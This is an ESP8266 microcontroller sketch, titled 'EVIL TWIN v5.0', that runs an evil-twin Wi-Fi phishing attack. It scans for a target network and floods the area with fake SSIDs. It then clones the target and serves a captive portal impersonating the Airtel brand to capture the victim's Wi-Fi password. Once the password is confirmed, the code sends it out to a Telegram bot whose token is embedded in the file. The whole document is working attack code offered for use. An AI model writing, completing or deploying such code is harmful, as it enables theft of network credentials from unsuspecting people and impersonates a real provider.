#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ESP8266HTTPClient.h>
#include <EEPROM.h>

// 🔥 CONFIG (REPLACE THESE)
const char* BOT_TOKEN = "8560004612:AAGG8sNRtXk_vUdTe5lRhT5ndTBAl_JMmhY";  // @BotFather
const char* CHAT_ID = "8560004612";     // getUpdates

const int LED_PIN = 2;  // D4

// 🔥 ALL FUNCTION PROTOTYPES (FIXED ERROR #1)
void blinkPattern(int count, int delay_time);
void sendTelegram(String message);
String urlEncode(String str);
void findTarget();
void floodAndAttack();
void captivePortal();
void gotPassword();
void connectAndSend();
void sendStyle();
void sendLogo();

DNSServer dns;
ESP8266WebServer server(80);
String TARGET_SSID = "";
String CAPTURED_PASS = "";
bool GOT_PASSWORD = false;
int FAKE_COUNT = 0;

void setup() {
  Serial.begin(115200);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH);
  
  Serial.println("\n🔥 EVIL TWIN v5.0 - PERFECT");
  delay(1000);
  
  findTarget();
}

void loop() {
  dns.processNextRequest();
  server.handleClient();
  
  if (GOT_PASSWORD && WiFi.status() != WL_CONNECTED) {
    connectAndSend();
  }
  delay(10);
}

void findTarget() {
  Serial.println("📡 WiFi Scan...");
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(2000);
  
  int n = WiFi.scanNetworks();
  Serial.printf("Found %d networks\n", n);
  
  int max_len = 0;
  for (int i = 0; i < n; i++) {
    String ssid = WiFi.SSID(i);
    int len = ssid.length();
    Serial.printf("  %s (%d chars)\n", ssid.c_str(), len);
    
    if (len > max_len && len > 8 && !ssid.startsWith("ESP")) {
      max_len = len;
      TARGET_SSID = ssid;
    }
  }
  
  WiFi.scanDelete();
  Serial.printf("🎯 TARGET: %s\n", TARGET_SSID.c_str());
  
  floodAndAttack();
}

void floodAndAttack() {
  Serial.println("🌪️ 20 Fake SSIDs Attack...");
  
  // 🔥 20 FAKE SSIDs (FIXED TIMING)
  for (int i = 0; i < 20; i++) {
    String fake = TARGET_SSID.substring(0, 8) + "_" + String(i+1);
    WiFi.mode(WIFI_AP);
    WiFi.softAP(fake.c_str());
    delay(1500);
    FAKE_COUNT++;
    Serial.printf("Fake %d: %s\n", FAKE_COUNT, fake.c_str());
    blinkPattern(1, 100);
  }
  
  // MAIN PHISHING AP
  IPAddress apIP(192, 168, 4, 1);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(TARGET_SSID.c_str());
  
  Serial.println("📶 ACTIVE: " + TARGET_SSID);
  
  // 🔥 CAPTIVE PORTAL (Single Click)
  dns.start(53, "*", apIP);
  
  server.on("/", HTTP_GET, captivePortal);
  server.on("/generate_204", HTTP_GET, captivePortal);
  server.on("/fwlink", HTTP_GET, captivePortal);
  server.on("/login", HTTP_POST, gotPassword);
  server.on("/style.css", HTTP_GET, sendStyle);
  server.on("/airtel.png", HTTP_GET, sendLogo);
  
  server.begin();
  blinkPattern(4, 250);
}

void captivePortal() {
  Serial.println("🎣 Victim: " + server.client().remoteIP().toString());
  
  String html = R"(
<!DOCTYPE html>
<html>
<head>
<meta name=viewport content="width=device-width">
<title>Airtel WiFi Login</title>
<link rel=stylesheet href="/style.css">
</head>
<body>
<div class=login>
<img src="/airtel.png" class=logo>
<h1>Airtel Xstream</h1>
<form action="/login" method=POST>
<input type=text name=ssid value=)HTML" + TARGET_SSID + R"( readonly>
<input type=password name=pass placeholder="Password" required>
<button>Connect</button>
</form>
<p>Secure Network</p>
</div>
</body>
</html>
  )";
  
  server.send(200, "text/html", html);
}

void gotPassword() {
  CAPTURED_PASS = server.arg("pass");
  GOT_PASSWORD = true;
  
  Serial.printf("🔥 PASS: %s\n", CAPTURED_PASS.c_str());
  blinkPattern(6, 200);
}

void connectAndSend() {
  Serial.println("📶 Real WiFi connect...");
  
  WiFi.mode(WIFI_STA);
  WiFi.begin(TARGET_SSID.c_str(), CAPTURED_PASS.c_str());
  
  int t = 0;
  while (WiFi.status() != WL_CONNECTED && t < 20) {
    delay(1000);
    Serial.print(".");
    t++;
  }
  
  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\n✅ Internet OK!");
    
    String msg = "🎉 SUCCESS!\nSSID: " + TARGET_SSID + "\nPASS: " + CAPTURED_PASS;
    sendTelegram(msg);
    
    blinkPattern(40, 150);  // FINAL!
    Serial.println("✅ COMPLETE!");
  }
}

void sendStyle() {
  server.send(200, "text/css", R"(
body{background:linear-gradient(135deg,#ff6b35,#f7931e);height:100vh;margin:0;display:flex;align-items:center;justify-content:center;font-family:Arial}
.login{background:white;padding:40px;border-radius:20px;box-shadow:0 20px 40px rgba(0,0,0,.3);text-align:center;max-width:350px}
.logo{width:70px;margin-bottom:20px}
h1{color:#333;font-size:26px;margin:20px 0}
input{width:100%;padding:15px;margin:10px 0;border:none;border-radius:10px;font-size:16px;box-sizing:border-box}
input[readonly]{background:#f0f0f0}
button{width:100%;padding:15px;background:#00a651;color:white;border:none;border-radius:10px;font-size:18px;cursor:pointer}
p{color:#666;font-size:14px;margin-top:20px}
  )");
}

void sendLogo() {
  server.send(200, "image/svg+xml", R"(
<svg width=70 height=70 viewBox=0 0 70 70>
<circle cx=35 cy=35 r=33 fill=#FF6B35/>
<text x=35 y=42 font-family=Arial font-size=14 fill=white font-weight=bold text-anchor=middle>AIRTEL</text>
<text x=35 y=55 font-size=9 fill=rgba(255,255,255,.8) text-anchor=middle>Xstream</text>
</svg>
  )");
}

// 🔥 SUPPORT FUNCTIONS
void blinkPattern(int count, int dly) {
  for (int i = 0; i < count; i++) {
    digitalWrite(LED_PIN, LOW);
    delay(dly);
    digitalWrite(LED_PIN, HIGH);
    delay(dly);
  }
}

void sendTelegram(String msg) {
  WiFiClient client;
HTTPClient http;

http.begin(client, "https://api.telegram.org/bot" + String(BOT_TOKEN) + 
           "/sendMessage?chat_id=" + String(CHAT_ID) + "&text=" + urlEncode(msg));
  http.GET();
  http.end();
  Serial.println("📱 Telegram sent");
}

String urlEncode(String s) {
  String e = "";
  for (int i = 0; i < s.length(); i++) {
    char c = s[i];
    if (isAlphaNumeric(c)) e += c;
    else e += '%' + String((byte)c >> 4, HEX) + String((byte)c & 0xF, HEX);
  }
  return e;
}
